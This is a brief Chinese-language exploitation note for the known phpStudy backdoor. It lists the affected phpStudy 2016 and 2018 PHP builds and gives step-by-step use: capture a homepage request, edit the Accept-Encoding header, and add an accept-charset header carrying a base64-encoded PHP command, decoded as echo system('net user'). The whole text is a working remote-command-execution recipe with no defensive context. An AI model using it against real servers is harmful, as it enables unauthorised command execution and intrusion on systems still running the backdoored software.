#漏洞版本
phpstudy后门

#影响版本
phpstudy 2016版php-5.4
phpstudy 2018版php-5.2.17
phpstudy 2018版php-5.4.45

#利用
浏览主页抓包

去掉Accept-Encoding:gzip, defate逗号后面的空格去掉，否则命令执行会失败

在请求头添加
accept-charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7


密文内容为 echo system('net user');